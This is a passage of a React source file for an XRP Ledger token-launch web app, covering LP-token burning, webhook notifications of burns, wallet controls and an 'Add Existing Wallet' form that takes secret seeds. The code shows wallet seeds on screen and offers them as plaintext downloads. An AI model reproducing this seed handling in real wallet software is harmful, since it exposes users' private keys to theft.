🔥 Tokens Burned (Black Hole)
━━━━━━━━━━━━━━━━━━━━━━
💎 Token: ${selectedToken.currency}
📊 Amount: ${selectedToken.balance}
👛 From: ${activeWallet.address}
🔗 Transaction: ${txHash}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
        `);
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error sending to black hole:', error);
      setMessage('Error burning tokens: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const burnLP = async () => {
    if (!activeWallet) {
      alert('Please select a wallet first');
      return;
    }

    setLoading(true);
    setMessage('Fetching AMM LP tokens...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      // Get LP tokens
      const lpTokens = await client.request({
        command: "account_lines",
        account: activeWallet.address
      });

      // Filter for LP tokens (those with AMM in the name or specific LP identifier)
      const ammTokens = lpTokens.result.lines.filter(line => 
        line.currency.includes('LP') || line.currency.includes('AMM')
      );

      if (!ammTokens.length) {
        throw new Error('No LP tokens found in wallet');
      }

      // Ask user to select LP token
      const selectedLP = await new Promise((resolve) => {
        const selection = window.confirm(
          `Found ${ammTokens.length} LP tokens. Select OK to burn LP tokens or Cancel to abort.`
        );
        if (selection) {
          resolve(ammTokens[0]); // For now, we'll use the first LP token
        } else {
          resolve(null);
        }
      });

      if (!selectedLP) {
        throw new Error('LP token selection cancelled');
      }

      setMessage('Attempting to send LP tokens to issuer...');

      // First try to send to issuer
      const issuerTransaction = {
        TransactionType: "Payment",
        Account: activeWallet.address,
        Destination: selectedLP.account, // LP token issuer
        Amount: {
          currency: selectedLP.currency,
          issuer: selectedLP.account,
          value: selectedLP.balance
        }
      };

      try {
        const preparedIssuer = await client.autofill(issuerTransaction);
        const signedIssuer = activeWallet.sign(preparedIssuer);
        const issuerResult = await client.submitAndWait(signedIssuer.tx_blob);

        if (issuerResult.result.meta.TransactionResult === "tesSUCCESS") {
          const txHash = issuerResult.result.hash;
          setMessage('LP tokens sent to issuer successfully');
          
          await WebhookManager.sendMessage(`
🔥 LP Tokens Burned (Sent to Issuer)
━━━━━━━━━━━━━━━━━━━━━━
💎 Token: ${selectedLP.currency}
📊 Amount: ${selectedLP.balance}
👛 From: ${activeWallet.address}
🎯 To: ${selectedLP.account}
🔗 Transaction: ${txHash}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
          `);
          return;
        }
      } catch (issuerError) {
        console.warn('Failed to send to issuer, trying black hole...', issuerError);
      }

      // If sending to issuer fails, send to black hole
      setMessage('Sending LP tokens to black hole...');
      const blackHoleTransaction = {
        TransactionType: "Payment",
        Account: activeWallet.address,
        Destination: "rrrrrrrrrrrrrrrrrrrrrhoLvTp",
        Amount: {
          currency: selectedLP.currency,
          issuer: selectedLP.account,
          value: selectedLP.balance
        }
      };

      const preparedBlackHole = await client.autofill(blackHoleTransaction);
      const signedBlackHole = activeWallet.sign(preparedBlackHole);
      const blackHoleResult = await client.submitAndWait(signedBlackHole.tx_blob);

      if (blackHoleResult.result.meta.TransactionResult === "tesSUCCESS") {
        const txHash = blackHoleResult.result.hash;
        setMessage('LP tokens sent to black hole successfully');
        
        await WebhookManager.sendMessage(`
🔥 LP Tokens Burned (Black Hole)
━━━━━━━━━━━━━━━━━━━━━━
💎 Token: ${selectedLP.currency}
📊 Amount: ${selectedLP.balance}
👛 From: ${activeWallet.address}
🔗 Transaction: ${txHash}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
        `);
      } else {
        throw new Error(`Transaction failed: ${blackHoleResult.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error burning LP:', error);
      setMessage('Error burning LP tokens: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const handlePreviewToml = () => {
    const tomlContent = TomlGenerator.generateToml(tokenData, activeWallet?.address || 'YOUR_ISSUER_ADDRESS');
    setTomlPreview(tomlContent);
    setShowTomlPreview(true);
  };

  const showError = (title, message, guide = null) => {
    setErrorModalContent({ title, message, guide });
    setShowErrorModal(true);
  };

  const handleWalletAction = async (action) => {
    if (loading) {
      showError(
        'Action in Progress',
        'Please wait for the current operation to complete before starting another.',
        null
      );
      return;
    }

    if (!activeWallet) {
      showError(
        'No Wallet Selected',
        'Please select or generate a wallet first.',
        {
          title: 'How to select a wallet',
          content: 'Click on any wallet card in the Wallet Management section to select it, or generate a new wallet using the "Generate New Wallet" button.'
        }
      );
      return;
    }

    try {
      switch (action) {
        case 'createAmm':
          if (!tokenData.ammAmount) {
            showError(
              'AMM Amount Required',
              'Please enter an initial AMM amount.',
              {
                title: 'Setting up AMM',
                content: 'Enter the amount of XRP you want to provide for initial AMM liquidity in the "AMM Initial Amount" field.'
              }
            );
            return;
          }
          if (!domainVerified) {
            showError(
              'Domain Verification Required',
              'Please verify your domain with TOML file before creating AMM.',
              {
                title: 'Domain Verification',
                content: 'Your domain needs to be verified with a TOML file before creating an AMM. Click OK to open the hosting guide.'
              }
            );
            setShowHostingGuide(true);
            return;
          }
          await createAmm();
          break;
        case 'withdrawAmm':
          setShowWithdrawModal(true);
          break;
        case 'freezeWallet':
          await freezeWallet();
          break;
        case 'unfreezeWallet':
          await unfreezeWallet();
          break;
        case 'blackHole':
          await blackHole();
          break;
        case 'burnLP':
          await burnLP();
          break;
        default:
          break;
      }
    } catch (error) {
      showError('Operation Failed', error.message);
    }
  };

  const handleGuideClose = () => {
    setShowHostingGuide(false);
    setStep(1);
  };

  const handleGuideNext = () => {
    if (step < 3) setStep(step + 1);
  };

  const handleGuideBack = () => {
    if (step > 1) setStep(step - 1);
  };

  const handleErrorModalAction = (e) => {
    e.stopPropagation();
    setShowErrorModal(false);
    if (errorModalContent.guide?.title === 'Domain Verification') {
      setShowHostingGuide(true);
    }
  };

  // Add this new function after your existing state declarations
  const addWallet = () => {
    setShowAddWalletModal(true);
    setSeedInput('');
    setAddWalletError('');
  };

  // Add this new function to handle the wallet addition
  const handleAddWallet = () => {
    try {
      if (!seedInput.trim()) {
        setAddWalletError('Please enter a seed phrase');
        return;
      }

      // Remove any whitespace from the seed
      const cleanSeed = seedInput.trim();

      try {
        const wallet = Wallet.fromSeed(cleanSeed);
        
        if (!wallet || !wallet.address) {
          setAddWalletError('Invalid wallet. Please check your seed phrase');
          return;
        }

        if (wallets.length >= 2) {
          setAddWalletError('Maximum wallet limit reached (2)');
          return;
        }

        if (wallets.some(w => w.address === wallet.address)) {
          setAddWalletError('This wallet is already added');
          return;
        }

        // Add the wallet if all checks pass
        setWallets(prevWallets => [...prevWallets, wallet]);
        setMessage('Wallet added successfully');
        setShowAddWalletModal(false);
        setSeedInput('');
        setAddWalletError('');
        setTimeout(() => setMessage(null), 3000);

      } catch (error) {
        console.error('Wallet creation error:', error);
        setAddWalletError('Invalid seed format. Please enter a valid XRPL secret/seed');
      }
    } catch (error) {
      console.error('Outer error:', error);
      setAddWalletError('An unexpected error occurred. Please try again.');
    }
  };

  return (
    <Router>
      <Routes>
        <Route path="/roadmap" element={<Roadmap />} />
        <Route path="/" element={
    <AppContainer>
            <GlobalStyle />
      <Header>
              <h1>
                LAUNCHX
                <img src="/assets/logo.svg" alt="LaunchX Logo" />
              </h1>
              <p>Create your token on XRPL with just a few clicks</p>
              <p className="highlight">CONTROL YOUR OWN LIQUIDITY!</p>
              <p>With every token created 50% of the fee immediately swaps for $LAX and burns the tokens</p>
              <SocialLinks>
                <SocialButton href="https://t.me/launchx_portal" target="_blank" rel="noopener noreferrer">
                  <span>
                    Telegram
                  </span>
                </SocialButton>
                <SocialButton href="https://x.com/LaunchXRPL" target="_blank" rel="noopener noreferrer">
                  <span>
                    Twitter
                  </span>
                </SocialButton>
                <SocialButton href="https://discord.gg/NhZMfCkQ9Q" target="_blank" rel="noopener noreferrer">
                  <span>
                    Discord
                  </span>
                </SocialButton>
                <SocialButton href="https://firstledger.net/token/rwqGqyU1aXzoyegsJRueick6CQ9JggfGSe/LAX" target="_blank" rel="noopener noreferrer">
                  <span>
                    Buy $LAX
                  </span>
                </SocialButton>
                <SocialButton href="https://dexscreener.com/xrpl/lax.rwqgqyu1axzoyegsjrueick6cq9jggfgse" target="_blank" rel="noopener noreferrer">
                  <span>
                    CHART
                  </span>
                </SocialButton>
                <SocialButton 
                  to="/roadmap" 
                  isInternal 
                  className="roadmap-button"
                >
                  <span>
                    Roadmap
                  </span>
                </SocialButton>
              </SocialLinks>
      </Header>

            <MainContent>
              <div>
                <WalletSection>
                  <SectionTitle>Wallet Management</SectionTitle>
                  <WalletActions style={{ marginBottom: '1rem' }}>
                    <Button 
                      onClick={generateWallet}
                      disabled={wallets.length >= 2}
                    >
                      Generate New Wallet
                    </Button>
                    <Button 
                      onClick={addWallet}
                      disabled={wallets.length >= 2}
                    >
                      Add Existing Wallet
                    </Button>
                  </WalletActions>

                  {wallets.map((wallet, index) => (
                    <WalletCard
                      key={index}
                      active={activeWallet && activeWallet.address === wallet.address}
                      onClick={() => selectWallet(wallet)}
                    >
                      <StatusBadge active={activeWallet && activeWallet.address === wallet.address}>
                        {activeWallet && activeWallet.address === wallet.address ? 'Active' : 'Click to Select'}
                      </StatusBadge>
                      
                      <WalletInfo>
                        <label>Address:</label>
                        <p>{wallet.address}</p>
                      </WalletInfo>
                      
                      <WalletInfo>
                        <label>Seed:</label>
                        <p>{wallet.seed}</p>
                      </WalletInfo>

                      <WalletActions>
          <Button 
                          onClick={(e) => {
                            e.stopPropagation();
                            const blob = new Blob(
                              [JSON.stringify({ address: wallet.address, seed: wallet.seed }, null, 2)],
                              { type: 'text/plain' }
                            );
                            const url = window.URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = `wallet_${wallet.address}.txt`;
                            a.setAttribute('aria-label', `Download wallet file for ${wallet.address}`);
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                            window.URL.revokeObjectURL(url);
                          }}
                        >
                          Download Wallet
          </Button>
                      </WalletActions>
        </WalletCard>
      ))}
                  
                  {wallets.length === 0 && (
                    <p style={{ textAlign: 'center', color: '#8b949e', marginTop: '1rem' }}>
                      No wallets generated yet. Click the button above to create one.
                    </p>
                  )}
                </WalletSection>

                <FormSection>
                  <SectionTitle>General Info</SectionTitle>
                  
                  <ImageUploadArea onClick={() => iconInputRef.current.click()}>
                    {tokenData.icon ? (
                      <div>
                        <img src={tokenData.icon} alt="Token Icon Preview" />
                        {tokenData.iconUrl && (
                          <p style={{ fontSize: '0.8rem', wordBreak: 'break-all', marginTop: '0.5rem' }}>
                            URL: {tokenData.iconUrl}
                          </p>
                        )}
                      </div>
                    ) : (
                      <p>Click to upload token icon</p>
                    )}
                    <input
                      ref={iconInputRef}
                      type="file"
                      hidden
                      accept="image/*"
                      onChange={(e) => handleImageUpload('icon', e)}
                    />
                  </ImageUploadArea>

                  <ImageUploadArea onClick={() => bannerInputRef.current.click()}>
                    {tokenData.banner ? (
                      <div>
                        <img src={tokenData.banner} alt="Token Banner Preview" />
                        {tokenData.bannerUrl && (
                          <p style={{ fontSize: '0.8rem', wordBreak: 'break-all', marginTop: '0.5rem' }}>
                            URL: {tokenData.bannerUrl}
                          </p>
                        )}
                      </div>
                    ) : (
                      <p>Click to upload token banner</p>
                    )}
                    <input
                      ref={bannerInputRef}
                      type="file"
                      hidden
                      accept="image/*"
                      onChange={(e) => handleImageUpload('banner', e)}
                    />
                  </ImageUploadArea>

                  <InputGroup>
                    <label>Token Name</label>
                    <Input
                      type="text"
                      value={tokenData.name}
                      onChange={(e) => setTokenData(prev => ({ ...prev, name: e.target.value }))}
                      placeholder="Enter token name"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Token Symbol</label>
                    <Input
                      type="text"
                      value={tokenData.symbol}
                      onChange={(e) => setTokenData(prev => ({ ...prev, symbol: e.target.value }))}
                      placeholder="3-4 characters (e.g. BTC)"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Description</label>
                    <Input
                      type="text"
                      value={tokenData.description}
                      onChange={(e) => setTokenData(prev => ({ ...prev, description: e.target.value }))}
                      placeholder="Enter token description"
                    />
                  </InputGroup>
                </FormSection>

                <FormSection>
                  <SectionTitle>Socials (optional)</SectionTitle>
                  
                  <InputGroup>
                    <label>Telegram</label>
                    <Input
                      type="text"
                      value={tokenData.telegram}
                      onChange={(e) => setTokenData(prev => ({ ...prev, telegram: e.target.value }))}
                      placeholder="@yourtelegram"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Twitter</label>
                    <Input
                      type="text"
                      value={tokenData.twitter}
                      onChange={(e) => setTokenData(prev => ({ ...prev, twitter: e.target.value }))}
                      placeholder="@yourtwitter"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Website</label>
                    <Input
                      type="text"
                      value={tokenData.website}
                      onChange={(e) => setTokenData(prev => ({ ...prev, website: e.target.value }))}
                      placeholder="https://yourwebsite.com"
                    />
                  </InputGroup>
                </FormSection>

                <FormSection>
                  <SectionTitle>Supply & Distribution</SectionTitle>
                  
                  <InputGroup>
                    <label>Total Supply</label>
                    <Input
                      type="number"
                      value={tokenData.supply}
                      onChange={(e) => setTokenData(prev => ({ ...prev, supply: e.target.value }))}
                      placeholder="Enter total supply"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Your Share: {tokenData.share}%</label>
                    <Slider
                      type="range"
                      min="0"
                      max="100"
                      value={tokenData.share}
                      onChange={(e) => setTokenData(prev => ({ ...prev, share: e.target.value }))}
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Additional Liquidity (XRP)</label>
                    <Input
                      type="number"
                      value={tokenData.additionalLiquidity}
                      onChange={(e) => setTokenData(prev => ({ ...prev, additionalLiquidity: e.target.value }))}
                      placeholder="Enter additional liquidity"
                    />
                  </InputGroup>
                </FormSection>

                <FormSection>
                  <SectionTitle>Token Configuration</SectionTitle>
                  
                  <InputGroup>
                    <label>Issuer Address (optional)</label>
                    <Input
                      type="text"
                      value={tokenData.issuerAddress}
                      onChange={(e) => setTokenData(prev => ({ ...prev, issuerAddress: e.target.value }))}
                      placeholder="Enter issuer address (default: active wallet)"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>Receiver Address (for AMM creation)</label>
                    <Input
                      type="text"
                      value={tokenData.receiverAddress}
                      onChange={(e) => setTokenData(prev => ({ ...prev, receiverAddress: e.target.value }))}
                      placeholder="Enter receiver address"
                    />
                  </InputGroup>

                  <InputGroup>
                    <label>AMM Initial Amount (XRP)</label>
                    <Input
                      type="number"
                      value={tokenData.ammAmount}
                      onChange={(e) => setTokenData(prev => ({ ...prev, ammAmount: e.target.value }))}
                      placeholder="Enter AMM initial amount"
                    />
                  </InputGroup>
                </FormSection>

                <FormSection>
                  <SectionTitle>Wallet Controls</SectionTitle>
                  
                  <WalletActions>
                    <WalletActionButton onClick={() => handleWalletAction('createAmm')}>
                      Create AMM
                    </WalletActionButton>
                    <WalletActionButton onClick={() => handleWalletAction('withdrawAmm')}>
                      Withdraw AMM
                    </WalletActionButton>
                    <WalletActionButton onClick={() => handleWalletAction('freezeWallet')}>
                      Freeze Wallet
                    </WalletActionButton>
                    <WalletActionButton onClick={() => handleWalletAction('unfreezeWallet')}>
                      Unfreeze Wallet
                    </WalletActionButton>
                    <WalletActionButton onClick={() => handleWalletAction('blackHole')}>
                      Black Hole 🔥
                    </WalletActionButton>
                    <WalletActionButton onClick={() => handleWalletAction('burnLP')}>
                      Burn LP 🔥
                    </WalletActionButton>
                  </WalletActions>
                </FormSection>
              </div>

              <SummaryCard>
                <SectionTitle>Summary</SectionTitle>
                
                <SummaryItem>
                  <span>Transaction Fee</span>
                  <span>{fees.tokenCreation} XRP</span>
                </SummaryItem>
                
                <SummaryItem>
                  <span>Account Reserve</span>
                  <span>{fees.accountReserve} XRP</span>
                </SummaryItem>
                
                <SummaryItem>
                  <span>Trustline Reserve</span>
                  <span>{fees.trustline} XRP</span>
                </SummaryItem>
                
                {fees.ammPool > 0 && (
                  <SummaryItem>
                    <span>AMM Pool Reserve</span>
                    <span>{fees.ammPool} XRP</span>
                  </SummaryItem>
                )}
                
                {fees.initialLiquidity > 0 && (
                  <SummaryItem>
                    <span>Initial Liquidity</span>
                    <span>{fees.initialLiquidity} XRP</span>
                  </SummaryItem>
                )}
                
                <SummaryItem>
                  <span>Creator Fee</span>
                  <span>{fees.creatorFee} XRP</span>
                </SummaryItem>
                
                {fees.sharePrice > 0 && (
                  <SummaryItem>
                    <span>Your Share Price</span>
                    <span>{fees.sharePrice} XRP</span>
                  </SummaryItem>
                )}
                
                <SummaryItem style={{ marginTop: '1rem', borderTop: '1px solid #30363d', paddingTop: '1rem' }}>
                  <span>Total Required</span>
                  <span>{fees.total} XRP</span>
                </SummaryItem>

                <Button 
                  primary 
                  onClick={createToken}
                  disabled={!activeWallet || !tokenData.name || !tokenData.symbol}
                >
                  {activeWallet ? 'Create Token' : 'Connect Wallet First'}
                </Button>
              </SummaryCard>
            </MainContent>

            <HostingGuideModal
              isOpen={showHostingGuide}
              onClose={handleGuideClose}
              onDomainSubmit={handleDomainSubmit}
              tokenSymbol={tokenData.symbol}
              step={step}
              onNext={handleGuideNext}
              onBack={handleGuideBack}
            />

            <PreviewButton onClick={handlePreviewToml}>
              Preview TOML
            </PreviewButton>

      {(loading || message) && (
        <LoadingOverlay 
          message={message} 
          isLoading={loading}
        />
      )}

            {showTomlPreview && (
              <ModalOverlay onClick={() => setShowTomlPreview(false)}>
                <TomlPreviewModal onClick={e => e.stopPropagation()}>
                  <Title>TOML Preview</Title>
                  <pre>{tomlPreview}</pre>
                  <Button onClick={() => setShowTomlPreview(false)}>Close</Button>
                </TomlPreviewModal>
              </ModalOverlay>
            )}

            {showImageUploadModal && (
              <ModalOverlay onClick={() => setShowImageUploadModal(false)}>
                <ImageUploadModal onClick={e => e.stopPropagation()}>
                  <Title>Upload to imgbox.com</Title>
                  
                  <div className="steps">
                    <div className="step">
                      <strong>1.</strong> Go to <strong>https://imgbox.com/</strong>
                    </div>
                    <div className="step">
                      <strong>2.</strong> Click "Upload Images"
                    </div>
                    <div className="step">
                      <strong>3.</strong> Select your image
                    </div>
                    <div className="step">
                      <strong>4.</strong> Important: Check "<strong>Family Safe</strong>" option
                    </div>
                    <div className="step">
                      <strong>5.</strong> Click "Upload"
                    </div>
                    <div className="step">
                      <strong>6.</strong> After upload completes:
                      <ul>
                        <li>Look for the "<strong>HTML Code</strong>" box</li>
                        <li>Click and drag to select <strong>ONLY</strong> the complete URL (starting with https://thumbs)</li>
                        <li>Press <strong>Ctrl+C</strong> (or Command+C on Mac) while the URL is selected</li>
                      </ul>
                    </div>
                  </div>

                  <div className="url-input-container">
                    <div className="url-help">
                      💡 The URL should look like: https://thumbs2.imgbox.com/1e/9b/e4Kj2e9r_t.png
                    </div>
                    <Input
                      type="text"
                      value={imageUploadUrl}
                      onChange={(e) => setImageUploadUrl(e.target.value)}
                      placeholder="Paste the image URL here"
                    />
                    {imageUploadError && <div className="error-message">{imageUploadError}</div>}
                  </div>

                  <div className="button-container">
                    <Button primary onClick={handleImageUrlSubmit}>
                      Submit URL
                    </Button>
                    <Button onClick={() => setShowImageUploadModal(false)}>
                      Cancel
                    </Button>
                  </div>
                </ImageUploadModal>
              </ModalOverlay>
            )}

            {showErrorModal && (
              <ModalOverlay onClick={handleErrorModalAction}>
                <ErrorModal onClick={e => e.stopPropagation()}>
                  <div className="error-icon">⚠️</div>
                  <div className="error-title">{errorModalContent.title}</div>
                  <div className="error-message">{errorModalContent.message}</div>
                  {errorModalContent.guide && (
                    <div className="guide">
                      <h4>{errorModalContent.guide.title}</h4>
                      <p>{errorModalContent.guide.content}</p>
                    </div>
                  )}
                  <Button onClick={handleErrorModalAction}>
                    {errorModalContent.guide?.title === 'Domain Verification' ? 'Open Guide' : 'Close'}
                  </Button>
                </ErrorModal>
              </ModalOverlay>
            )}

            {showWithdrawModal && (
              <ModalOverlay onClick={() => setShowWithdrawModal(false)}>
                <WithdrawModal onClick={e => e.stopPropagation()}>
                  <Title>Withdraw AMM</Title>
                  <div className="percentage-display">{withdrawPercentage}%</div>
                  <div className="slider-container">
                    <Slider
                      type="range"
                      min="1"
                      max="100"
                      value={withdrawPercentage}
                      onChange={(e) => setWithdrawPercentage(parseInt(e.target.value))}
                    />
                  </div>
                  <ButtonContainer>
                    <Button onClick={() => setShowWithdrawModal(false)}>Cancel</Button>
                    <Button primary onClick={withdrawAmm}>
                      Withdraw {withdrawPercentage}%
                    </Button>
                  </ButtonContainer>
                </WithdrawModal>
              </ModalOverlay>
            )}

            {showAddWalletModal && (
              <ModalOverlay>
                <ModalContent>
                  <Title>Add Existing Wallet</Title>
                  
                  <div className="input-container">
                    <Input
                      type="text"
                      value={seedInput}
                      onChange={(e) => setSeedInput(e.target.value)}
                      placeholder="Enter your wallet seed phrase"
                    />
                    {addWalletError && <div className="error-message">{addWalletError}</div>}
                  </div>

                  <ButtonContainer>
                    <Button onClick={() => setShowAddWalletModal(false)}>
                      Cancel
                    </Button>
                    <Button primary onClick={handleAddWallet}>
                      Add Wallet
                    </Button>
                  </ButtonContainer>
                </ModalContent>
              </ModalOverlay>
            )}
    </AppContainer>
        } />
      </Routes>
    </Router>
  );
}

export default App; 
